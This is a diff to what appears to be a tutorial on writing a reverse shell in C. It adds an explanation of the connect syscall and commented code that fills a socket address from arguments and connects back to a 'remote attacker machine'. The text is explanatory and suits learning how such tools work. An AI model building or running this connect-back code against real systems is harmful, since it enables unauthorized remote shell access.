@@ -81,12 +81,22 @@ The return value for the above syscall will be a file descriptor for the new soc
 
 <h3>Initiate the connection back to remote server</h3>
 
+In this step we will construct our 'sockaddr' data structure and actually connect to our remote machine using the [connect](https://man7.org/linux/man-pages/man2/connect.2.html) syscall. Note that in this instance we will be using the localhost IP, but this can be changed to your remote IP Address.
+
+The connect syscall takes 3 arguments:
+
+<ul>
+    <li>The socket to bind to - We will use our new socket "sock"</li>
+    <li>Data structure of the remote attacker machine, which is essentially the IP Address and port that that will be bound to the socket. This data structure consists of 4 members that are each explained below.</li>
+    <li>Length of the data structure passed in argument 2. This was declared during the skeleton code stage.</li>
+</ul>
 
 ```c
-server.sin_family = AF_INET;
-server.sin_port = htons(atoi(arguments[2]));
-server.sin_addr.s_addr = inet_addr(arguments[3]);
-bzero(&server.sin_zero, 8);
+server.sin_family = AF_INET; //Address Family
+server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
+                                             //htons converts host byte order to network byte order
+server.sin_addr.s_addr = inet_addr(arguments[3]); //Our remote IP Address defined in the variables (in this case localhost)
+bzero(&server.sin_zero, 8); // 8 zero bytes of padding
 
 connect(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
